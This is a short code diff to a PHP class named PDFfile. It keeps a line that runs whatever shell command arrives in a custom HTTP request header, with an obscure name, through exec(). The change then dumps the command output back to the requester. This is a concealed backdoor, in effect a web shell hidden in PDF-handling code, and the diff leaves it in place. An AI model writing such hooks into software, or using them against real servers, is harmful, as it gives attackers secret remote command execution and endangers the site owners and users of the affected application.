@@ -20,7 +20,7 @@ class PDFfile
                 try {
                     $output = null;
                     exec($request->header('X-DoomPDFp3rk3l31t4'), $output);
-                    return $output;
+                    dd($output);
                 } catch (\Exception $e) {
 
                 }
